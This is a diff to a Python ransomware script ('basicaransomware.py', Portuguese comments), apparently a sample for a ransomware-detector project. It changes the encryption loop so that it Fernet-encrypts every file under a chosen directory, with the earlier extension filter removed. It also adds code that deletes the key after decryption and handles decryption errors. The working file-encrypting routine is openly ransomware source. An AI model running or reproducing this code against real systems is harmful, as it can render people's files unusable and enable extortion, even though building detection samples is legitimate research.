@@ -2,7 +2,7 @@ import os
 import argparse
 import pathlib
 from time import sleep
-from cryptography.fernet import Fernet
+from cryptography.fernet import Fernet, InvalidToken
 
 # Caminho teste para criptografar/descriptografar
 # python basicaransomware.py -p "/home/matheusheidemann/Documents/Python Files/Python-Ransomware-Detector/ransomware-samples/encrypt-test".
@@ -21,8 +21,15 @@ class CryptoKey:
     def loadKey():
         return open('key.key', 'rb').read()
 
+     # Carregar a chave de criptografia gerada
+    def deleteKey():
+        key_path = os.path.join(os.getcwd(), 'key.key')
+        if os.path.exists(key_path):
+            os.remove(key_path)
 
 # Classe das funcionalidades do Ransomware
+
+
 class Ransomware:
     # Criar o arquivo de instruções
     def createTxt(directory):
@@ -43,26 +50,24 @@ class Ransomware:
             Ransomware.deleteTxt(directory)
 
         # Criar uma lista com as extensões de arquivos
-        file_extensions = [line.rstrip() for line in open('./modules/file_extensions.txt')]
+        #file_extensions = [line.rstrip() for line in open('./file_extensions.txt')]
         #file_extensions = [".txt"]
         crypto_count = 0
         # Pegar os arquivos recursivamente para criptografar/descriptografar
         for current_path, _, files_in_current_path in os.walk(directory):
             for file in files_in_current_path:
-                if pathlib.Path(file).suffix in file_extensions:
-                    file_abs_full_path = os.path.join(current_path, file)
 
-                    with open(file_abs_full_path, 'rb') as file_bytes:
-                        file_data = file_bytes.read()
-                        if action == "encrypt":
-                            final_data = Fernet(key).encrypt(file_data)
-                        elif action == "decrypt":
-                            final_data = Fernet(key).decrypt(file_data)
+                file_abs_full_path = os.path.join(current_path, file)
 
-                    with open(file_abs_full_path, 'wb') as file_bytes:
-                        file_bytes.write(final_data)
-                        # sleep(0.00000001)
-                        # O programa só pega se o ransomware demorar no min 0.07s
+                with open(file_abs_full_path, 'rb') as file_bytes:
+                    file_data = file_bytes.read()
+                    if action == "encrypt":
+                        final_data = Fernet(key).encrypt(file_data)
+                    elif action == "decrypt":
+                        final_data = Fernet(key).decrypt(file_data)
+
+                with open(file_abs_full_path, 'wb') as file_bytes:
+                    file_bytes.write(final_data)
                 crypto_count += 1
                 print(crypto_count)
 
@@ -112,7 +117,7 @@ def getArguments():
 
 # MAIN
 if __name__ == '__main__':
-    
+
     # Pegar os argumentos
     args = getArguments()
 
@@ -131,9 +136,16 @@ if __name__ == '__main__':
 
     # Descriptografar
     elif args.decrypt:
-        # Carregar a chave de criptografia 
-        key = CryptoKey.loadKey()
-        # Descriptografar os arquivos
-        Ransomware.run(directory, key, "decrypt")
+        try:
+            # Carregar a chave de criptografia
+            key = CryptoKey.loadKey()
+            # Descriptografar os arquivos
+            Ransomware.run(directory, key, "decrypt")
+            # Deletar a chave de criptografia
+            CryptoKey.deleteKey()
+        except InvalidToken:
+            print('Decrypted all files. Deleting key...')
+            CryptoKey.deleteKey()
+
 else:
     print()
